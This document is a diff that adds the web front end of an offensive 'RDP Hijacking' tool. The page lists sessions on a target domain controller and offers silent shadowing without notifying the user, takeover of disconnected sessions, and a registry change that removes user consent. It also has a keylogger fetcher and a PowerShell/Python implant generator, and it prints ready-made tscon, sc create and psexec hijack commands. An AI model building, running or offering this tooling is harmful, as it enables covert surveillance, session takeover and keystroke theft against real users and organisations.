@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RDP Hijacking - Shadow Session Attack</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .glow-purple { box-shadow: 0 0 20px rgba(147, 51, 234, 0.5); }
+        .pulse-purple { animation: pulse-purple 2s infinite; }
+        @keyframes pulse-purple {
+            0%, 100% { box-shadow: 0 0 20px rgba(147, 51, 234, 0.5); }
+            50% { box-shadow: 0 0 40px rgba(147, 51, 234, 0.8); }
+        }
+        .terminal-font { font-family: 'Courier New', monospace; }
+        .session-card { transition: all 0.3s ease; }
+        .session-card:hover { transform: translateY(-2px); }
+    </style>
+</head>
+<body class="bg-gray-900 text-white min-h-screen">
+    <!-- Header -->
+    <div class="bg-gradient-to-r from-purple-900 via-purple-800 to-indigo-900 p-6 shadow-2xl">
+        <div class="max-w-7xl mx-auto">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-4">
+                    <div class="w-16 h-16 bg-purple-600 rounded-xl flex items-center justify-center pulse-purple">
+                        <i class="fas fa-desktop text-3xl"></i>
+                    </div>
+                    <div>
+                        <h1 class="text-3xl font-bold">RDP Hijacking</h1>
+                        <p class="text-purple-200">Shadow Session Attack - Silent Takeover</p>
+                    </div>
+                </div>
+                <div class="flex items-center space-x-4">
+                    <span class="px-4 py-2 bg-purple-600 rounded-lg font-bold animate-pulse">
+                        <i class="fas fa-ghost mr-2"></i>PRO
+                    </span>
+                    <a href="/" class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg transition">
+                        <i class="fas fa-arrow-left mr-2"></i>Dashboard
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Info Banner -->
+    <div class="bg-purple-900/30 border-l-4 border-purple-500 p-4 mx-6 mt-6 rounded-r-lg">
+        <div class="flex items-center">
+            <i class="fas fa-user-secret text-purple-400 text-2xl mr-4"></i>
+            <div>
+                <p class="font-bold text-purple-300">Kullanıcının Ruhu Duymadan Oturuma Bağlan</p>
+                <p class="text-purple-200 text-sm">Mevcut RDP oturumunu izle veya kontrol et - oturum kapatılmadan!</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="max-w-7xl mx-auto p-6">
+        <!-- Attack Modes -->
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
+            <div class="bg-gray-800 rounded-xl p-4 border border-green-500/30 hover:border-green-500 transition cursor-pointer" onclick="setMode('view')">
+                <div class="flex items-center">
+                    <div class="w-10 h-10 bg-green-600 rounded-lg flex items-center justify-center mr-3">
+                        <i class="fas fa-eye"></i>
+                    </div>
+                    <div>
+                        <p class="font-bold">View Only</p>
+                        <p class="text-xs text-gray-400">Watch silently</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bg-gray-800 rounded-xl p-4 border border-yellow-500/30 hover:border-yellow-500 transition cursor-pointer" onclick="setMode('control')">
+                <div class="flex items-center">
+                    <div class="w-10 h-10 bg-yellow-600 rounded-lg flex items-center justify-center mr-3">
+                        <i class="fas fa-mouse-pointer"></i>
+                    </div>
+                    <div>
+                        <p class="font-bold">Full Control</p>
+                        <p class="text-xs text-gray-400">Mouse & keyboard</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bg-gray-800 rounded-xl p-4 border border-purple-500/30 hover:border-purple-500 transition cursor-pointer" onclick="setMode('silent_view')">
+                <div class="flex items-center">
+                    <div class="w-10 h-10 bg-purple-600 rounded-lg flex items-center justify-center mr-3">
+                        <i class="fas fa-ghost"></i>
+                    </div>
+                    <div>
+                        <p class="font-bold">Silent View</p>
+                        <p class="text-xs text-gray-400">No notification</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bg-gray-800 rounded-xl p-4 border border-red-500/30 hover:border-red-500 transition cursor-pointer" onclick="setMode('silent_control')">
+                <div class="flex items-center">
+                    <div class="w-10 h-10 bg-red-600 rounded-lg flex items-center justify-center mr-3">
+                        <i class="fas fa-skull"></i>
+                    </div>
+                    <div>
+                        <p class="font-bold">Silent Control</p>
+                        <p class="text-xs text-gray-400">Full stealth</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <!-- Target Configuration -->
+            <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+                <h2 class="text-xl font-bold mb-4 text-purple-400">
+                    <i class="fas fa-crosshairs mr-2"></i>Target Machine
+                </h2>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-sm text-gray-400 mb-2">Target Host</label>
+                        <input type="text" id="targetHost" value="dc01.corp.local" 
+                               class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-3 focus:border-purple-500 focus:outline-none">
+                    </div>
+                    
+                    <div>
+                        <label class="block text-sm text-gray-400 mb-2">Current Mode</label>
+                        <div id="currentMode" class="bg-gray-900 border border-purple-500 rounded-lg px-4 py-3 text-purple-400 font-bold">
+                            <i class="fas fa-mouse-pointer mr-2"></i>Full Control
+                        </div>
+                    </div>
+                    
+                    <button onclick="enumerateSessions()" 
+                            class="w-full bg-purple-600 hover:bg-purple-500 py-3 rounded-lg font-bold transition">
+                        <i class="fas fa-search mr-2"></i>Enumerate Sessions
+                    </button>
+                </div>
+            </div>
+
+            <!-- Active Sessions -->
+            <div class="lg:col-span-2 bg-gray-800 rounded-xl p-6 border border-gray-700">
+                <h2 class="text-xl font-bold mb-4 text-green-400">
+                    <i class="fas fa-users mr-2"></i>Active RDP Sessions
+                </h2>
+                
+                <div id="sessionsContainer" class="space-y-3 max-h-80 overflow-y-auto">
+                    <p class="text-gray-500 text-center py-8">Click "Enumerate Sessions" to scan target</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Session Details & Actions -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 mt-6">
+            <!-- Selected Session -->
+            <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+                <h2 class="text-xl font-bold mb-4 text-yellow-400">
+                    <i class="fas fa-user-tie mr-2"></i>Selected Session
+                </h2>
+                
+                <div id="selectedSession" class="bg-gray-900 rounded-lg p-4 border border-gray-700">
+                    <p class="text-gray-500 text-center">Select a session from the list</p>
+                </div>
+                
+                <div class="grid grid-cols-2 gap-4 mt-4">
+                    <button onclick="shadowSession()" id="shadowBtn" disabled
+                            class="bg-purple-600 hover:bg-purple-500 disabled:bg-gray-600 py-3 rounded-lg font-bold transition">
+                        <i class="fas fa-eye mr-2"></i>Shadow Session
+                    </button>
+                    <button onclick="takeoverSession()" id="takeoverBtn" disabled
+                            class="bg-red-600 hover:bg-red-500 disabled:bg-gray-600 py-3 rounded-lg font-bold transition">
+                        <i class="fas fa-sign-in-alt mr-2"></i>Takeover
+                    </button>
+                </div>
+            </div>
+
+            <!-- Command Generator -->
+            <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+                <h2 class="text-xl font-bold mb-4 text-cyan-400">
+                    <i class="fas fa-terminal mr-2"></i>Generated Commands
+                </h2>
+                
+                <div class="space-y-3" id="commandsContainer">
+                    <div class="bg-gray-900 rounded-lg p-3">
+                        <p class="text-xs text-gray-400 mb-1">Native Shadow</p>
+                        <code class="text-green-400 text-sm">mstsc /shadow:{id} /v:{server} /control</code>
+                    </div>
+                    <div class="bg-gray-900 rounded-lg p-3">
+                        <p class="text-xs text-gray-400 mb-1">Disconnected Takeover</p>
+                        <code class="text-green-400 text-sm">tscon {id} /dest:console</code>
+                    </div>
+                    <div class="bg-gray-900 rounded-lg p-3">
+                        <p class="text-xs text-gray-400 mb-1">Service Method</p>
+                        <code class="text-green-400 text-sm">sc create hijack binpath= "tscon {id} /dest:console"</code>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tools Section -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mt-6">
+            <!-- Enable Silent Shadow -->
+            <div class="bg-gray-800 rounded-xl p-6 border border-orange-500/30">
+                <div class="flex items-center mb-4">
+                    <div class="w-12 h-12 bg-orange-600 rounded-lg flex items-center justify-center mr-3">
+                        <i class="fas fa-cog text-xl"></i>
+                    </div>
+                    <div>
+                        <h3 class="font-bold">Enable Silent Shadow</h3>
+                        <p class="text-xs text-gray-400">Registry modification</p>
+                    </div>
+                </div>
+                <p class="text-sm text-gray-400 mb-4">Modify registry to allow shadow without user consent</p>
+                <button onclick="enableSilentShadow()" class="w-full bg-orange-600 hover:bg-orange-500 py-2 rounded-lg text-sm transition">
+                    <i class="fas fa-unlock mr-2"></i>Enable
+                </button>
+            </div>
+
+            <!-- Keylogger -->
+            <div class="bg-gray-800 rounded-xl p-6 border border-pink-500/30">
+                <div class="flex items-center mb-4">
+                    <div class="w-12 h-12 bg-pink-600 rounded-lg flex items-center justify-center mr-3">
+                        <i class="fas fa-keyboard text-xl"></i>
+                    </div>
+                    <div>
+                        <h3 class="font-bold">Session Keylogger</h3>
+                        <p class="text-xs text-gray-400">Capture keystrokes</p>
+                    </div>
+                </div>
+                <p class="text-sm text-gray-400 mb-4">Capture all keystrokes from shadowed session</p>
+                <button onclick="getKeylogger()" class="w-full bg-pink-600 hover:bg-pink-500 py-2 rounded-lg text-sm transition">
+                    <i class="fas fa-download mr-2"></i>Get Code
+                </button>
+            </div>
+
+            <!-- Techniques -->
+            <div class="bg-gray-800 rounded-xl p-6 border border-blue-500/30">
+                <div class="flex items-center mb-4">
+                    <div class="w-12 h-12 bg-blue-600 rounded-lg flex items-center justify-center mr-3">
+                        <i class="fas fa-book text-xl"></i>
+                    </div>
+                    <div>
+                        <h3 class="font-bold">Attack Techniques</h3>
+                        <p class="text-xs text-gray-400">All methods</p>
+                    </div>
+                </div>
+                <p class="text-sm text-gray-400 mb-4">View all RDP hijacking techniques and OPSEC notes</p>
+                <button onclick="showTechniques()" class="w-full bg-blue-600 hover:bg-blue-500 py-2 rounded-lg text-sm transition">
+                    <i class="fas fa-list mr-2"></i>View All
+                </button>
+            </div>
+        </div>
+
+        <!-- Implant Generator -->
+        <div class="bg-gray-800 rounded-xl p-6 mt-6 border border-gray-700">
+            <h2 class="text-xl font-bold mb-4 text-green-400">
+                <i class="fas fa-code mr-2"></i>RDP Hijacker Implant
+            </h2>
+            
+            <div class="flex space-x-4 mb-4">
+                <button onclick="generateImplant('powershell')" 
+                        class="flex-1 bg-blue-600 hover:bg-blue-500 py-2 rounded-lg transition">
+                    <i class="fab fa-windows mr-2"></i>PowerShell
+                </button>
+                <button onclick="generateImplant('python')" 
+                        class="flex-1 bg-yellow-600 hover:bg-yellow-500 py-2 rounded-lg transition">
+                    <i class="fab fa-python mr-2"></i>Python
+                </button>
+            </div>
+            
+            <textarea id="implantCode" rows="15" readonly
+                      class="w-full bg-gray-900 border border-gray-700 rounded-lg px-4 py-3 text-sm terminal-font text-green-400"></textarea>
+            
+            <button onclick="copyCode()" class="mt-2 bg-gray-700 hover:bg-gray-600 px-4 py-2 rounded-lg transition">
+                <i class="fas fa-copy mr-2"></i>Copy to Clipboard
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let currentMachineId = null;
+        let selectedSessionId = null;
+        let currentMode = 'control';
+        let sessions = [];
+
+        function setMode(mode) {
+            currentMode = mode;
+            const modeNames = {
+                'view': { icon: 'fa-eye', name: 'View Only', color: 'text-green-400' },
+                'control': { icon: 'fa-mouse-pointer', name: 'Full Control', color: 'text-yellow-400' },
+                'silent_view': { icon: 'fa-ghost', name: 'Silent View', color: 'text-purple-400' },
+                'silent_control': { icon: 'fa-skull', name: 'Silent Control', color: 'text-red-400' }
+            };
+            const m = modeNames[mode];
+            document.getElementById('currentMode').innerHTML = `<i class="fas ${m.icon} mr-2"></i>${m.name}`;
+            document.getElementById('currentMode').className = `bg-gray-900 border border-purple-500 rounded-lg px-4 py-3 font-bold ${m.color}`;
+        }
+
+        async function enumerateSessions() {
+            const host = document.getElementById('targetHost').value;
+            
+            try {
+                const response = await fetch('/rdp-hijack/api/enumerate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target_host: host })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentMachineId = data.machine.machine_id;
+                    sessions = data.machine.sessions;
+                    displaySessions(data.machine.sessions);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        function displaySessions(sessionList) {
+            const container = document.getElementById('sessionsContainer');
+            
+            if (sessionList.length === 0) {
+                container.innerHTML = '<p class="text-gray-500 text-center py-8">No active sessions found</p>';
+                return;
+            }
+            
+            container.innerHTML = sessionList.map(s => `
+                <div class="session-card bg-gray-900 rounded-lg p-4 border ${s.state === 'disconnected' ? 'border-red-500/50' : 'border-gray-700'} cursor-pointer hover:border-purple-500"
+                     onclick="selectSession(${s.session_id})">
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center">
+                            <div class="w-10 h-10 ${s.is_admin ? 'bg-red-600' : 'bg-blue-600'} rounded-lg flex items-center justify-center mr-3">
+                                <i class="fas ${s.is_admin ? 'fa-user-shield' : 'fa-user'}"></i>
+                            </div>
+                            <div>
+                                <p class="font-bold">${s.domain}\\${s.username}</p>
+                                <p class="text-xs text-gray-400">Session ${s.session_id} | From: ${s.client_ip}</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <span class="px-2 py-1 ${s.state === 'active' ? 'bg-green-600' : 'bg-red-600'} rounded text-xs">${s.state}</span>
+                            ${s.state === 'disconnected' ? '<p class="text-xs text-red-400 mt-1">⚠️ Takeover possible!</p>' : ''}
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function selectSession(sessionId) {
+            selectedSessionId = sessionId;
+            const session = sessions.find(s => s.session_id === sessionId);
+            
+            if (session) {
+                document.getElementById('selectedSession').innerHTML = `
+                    <div class="flex items-center justify-between">
+                        <div>
+                            <p class="font-bold text-lg">${session.domain}\\${session.username}</p>
+                            <p class="text-sm text-gray-400">Session ID: ${session.session_id}</p>
+                            <p class="text-sm text-gray-400">Client: ${session.client_name} (${session.client_ip})</p>
+                            <p class="text-sm text-gray-400">Logon: ${session.logon_time}</p>
+                            <p class="text-sm text-gray-400">Idle: ${session.idle_time}s</p>
+                        </div>
+                        <div class="text-center">
+                            <span class="px-3 py-1 ${session.state === 'active' ? 'bg-green-600' : 'bg-red-600'} rounded font-bold">${session.state.toUpperCase()}</span>
+                            ${session.is_admin ? '<p class="text-red-400 text-xs mt-2"><i class="fas fa-crown"></i> ADMIN</p>' : ''}
+                        </div>
+                    </div>
+                `;
+                
+                document.getElementById('shadowBtn').disabled = false;
+                document.getElementById('takeoverBtn').disabled = session.state !== 'disconnected';
+                
+                updateCommands(session);
+            }
+        }
+
+        function updateCommands(session) {
+            const host = document.getElementById('targetHost').value;
+            document.getElementById('commandsContainer').innerHTML = `
+                <div class="bg-gray-900 rounded-lg p-3">
+                    <p class="text-xs text-gray-400 mb-1">Native Shadow</p>
+                    <code class="text-green-400 text-sm">mstsc /shadow:${session.session_id} /v:${host} /control</code>
+                </div>
+                <div class="bg-gray-900 rounded-lg p-3">
+                    <p class="text-xs text-gray-400 mb-1">Disconnected Takeover</p>
+                    <code class="text-green-400 text-sm">tscon ${session.session_id} /dest:console</code>
+                </div>
+                <div class="bg-gray-900 rounded-lg p-3">
+                    <p class="text-xs text-gray-400 mb-1">Service Method (SYSTEM)</p>
+                    <code class="text-green-400 text-sm">sc create hijack binpath= "tscon ${session.session_id} /dest:console" && sc start hijack</code>
+                </div>
+                <div class="bg-gray-900 rounded-lg p-3">
+                    <p class="text-xs text-gray-400 mb-1">PsExec Method</p>
+                    <code class="text-green-400 text-sm">psexec -s -i tscon ${session.session_id} /dest:console</code>
+                </div>
+            `;
+        }
+
+        async function shadowSession() {
+            if (!currentMachineId || selectedSessionId === null) return;
+            
+            try {
+                const response = await fetch('/rdp-hijack/api/shadow', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        machine_id: currentMachineId,
+                        session_id: selectedSessionId,
+                        mode: currentMode
+                    })
+                });
+                
+                const data = await response.json();
+                alert(data.success ? `Shadow session initiated! Mode: ${data.hijack.mode}` : 'Failed to shadow');
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        async function takeoverSession() {
+            if (!currentMachineId || selectedSessionId === null) return;
+            
+            try {
+                const response = await fetch('/rdp-hijack/api/takeover', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        machine_id: currentMachineId,
+                        session_id: selectedSessionId
+                    })
+                });
+                
+                const data = await response.json();
+                alert(data.success ? 'Session takeover initiated!' : data.error);
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        async function enableSilentShadow() {
+            const host = document.getElementById('targetHost').value;
+            
+            try {
+                const response = await fetch('/rdp-hijack/api/enable-silent-shadow', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target_host: host })
+                });
+                
+                const data = await response.json();
+                console.log('Silent Shadow Config:', data);
+                alert('Registry commands generated! Check console for details.');
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        async function getKeylogger() {
+            try {
+                const response = await fetch('/rdp-hijack/api/capture-keystrokes', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ hijack_id: 'demo' })
+                });
+                
+                const data = await response.json();
+                if (data.capture_tools) {
+                    document.getElementById('implantCode').value = data.capture_tools.keylogger_code;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        async function showTechniques() {
+            try {
+                const response = await fetch('/rdp-hijack/api/techniques');
+                const data = await response.json();
+                console.log('Techniques:', data);
+                alert(`${data.techniques.techniques.length} techniques available. Check console for details.`);
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        async function generateImplant(type) {
+            try {
+                const response = await fetch('/rdp-hijack/api/generate-implant', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type: type })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    document.getElementById('implantCode').value = data.code;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        function copyCode() {
+            const code = document.getElementById('implantCode');
+            code.select();
+            document.execCommand('copy');
+            alert('Copied to clipboard!');
+        }
+    </script>
+</body>
+</html>
